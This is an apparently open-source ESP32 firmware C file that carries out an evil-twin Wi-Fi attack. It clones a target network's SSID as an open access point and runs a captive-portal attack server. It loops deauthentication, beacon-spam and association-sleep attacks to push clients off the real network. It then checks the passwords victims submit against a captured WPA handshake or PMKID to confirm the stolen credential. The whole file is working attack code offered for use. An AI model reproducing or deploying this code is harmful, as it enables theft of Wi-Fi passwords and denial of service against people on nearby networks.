#include <string.h>
#include "esp_log.h"
#include "esp_task_wdt.h"
#include "utils.h"
#include "wifiMng.h"
#include "admin_server.h"
#include "server.h"
#include "evil_twin.h"
#include "aircrack.h"
#include "wifi_attacks.h"


/* Store target information */
static const char *TAG = "EVIL_TWIN:";
static target_info_t target = { 0 };
static TaskHandle_t evil_twin_task_handle = NULL;


static void evil_twin_task(void *pvParameters) 
{
    vTaskDelay(pdMS_TO_TICKS(1000));

    /* Stop admin server TODO: Verificare se possibile lasciarlo attivo se non usa troppa ram */
    //http_admin_server_stop();

    /* Get target information */
    /*Try guess by ssid */
    target.vendor = getVendor((char *)&target.ssid);

    /* Clone Access Point */
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = { 0 },
            .ssid_len = 0,
            .channel = target.channel,
            .password = "",
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                    /* Cannot set pmf to required when in wpa-wpa2 mixed mode! Setting pmf to optional mode. */
                    .required = false, 
                    .capable = true
            }
        },
    };
    strcpy((char *)&wifi_config.ap.ssid, (char *)&target.ssid);
    wifi_ap_clone(&wifi_config, NULL);

    /* Wait AP to be cloned */
    vTaskDelay(pdMS_TO_TICKS(5000));

    /* Start captive portal server */
    http_attack_server_start((target_info_t * )&target);

    /* Start wifi attack engine */
    wifi_attack_engine_start((target_info_t * )&target);

    while(true)
    {
        /* Spam softAP beacon from STA */
        wifi_attack_softap_beacon_spam((target_info_t * )&target);

        /* Send deauth to clients */
        wifi_attack_deauth_basic();
        vTaskDelay(pdMS_TO_TICKS(20));
        //wifi_attack_deauth_client_bad_msg1();
        //wifi_attack_deauth_client_negative_tx_power();
        wifi_attack_association_sleep();

        vTaskDelay(pdMS_TO_TICKS(200));
    }
}


void evil_twin_start_attack(target_info_t *targe_info)
{
    if( evil_twin_task_handle != NULL )
    {   
        ESP_LOGE(TAG, "EvilTwin task already started.");
        return;
    }

    memcpy(&target, targe_info, sizeof(target_info_t));
    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 5, &evil_twin_task_handle);

    ESP_LOGI(TAG, "Evil-Twin attack started.");
    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target.ssid, target.channel);
}


void evil_twin_stop_attack(void)
{
    if (evil_twin_task_handle == NULL)
    {
        ESP_LOGE(TAG, "EvilTwin task is not running.");
        return;
    }
       
    /* Kill task */
    vTaskDelete(evil_twin_task_handle);
    evil_twin_task_handle = NULL;

    /* Close attack server */
    http_attack_server_stop();

    /* Stop attack engine */
    wifi_attack_engine_stop();

    /* Wait engine stop */
    vTaskDelay(pdMS_TO_TICKS(3000));

    /* Restore original hotspot */
    wifi_start_softap();

    /* Wait softap restore */
    vTaskDelay(pdMS_TO_TICKS(3000));

    /* Start Admin server */
    http_admin_server_start();

    ESP_LOGI(TAG, "Evil-Twin attack stopped.");
}


bool evil_twin_check_password(char *password)
{
    handshake_info_t *handshake = wifi_attack_engine_handshake();

    bool handshake_test = false;
    bool pmkid_test = false;

    if( handshake->pmkid_captured)
    {
        pmkid_test = verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
    }
    if( handshake->handshake_captured)
    {
        handshake_test = verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic, handshake->key_decriptor_version);
    }
    
    return (handshake_test || pmkid_test);
}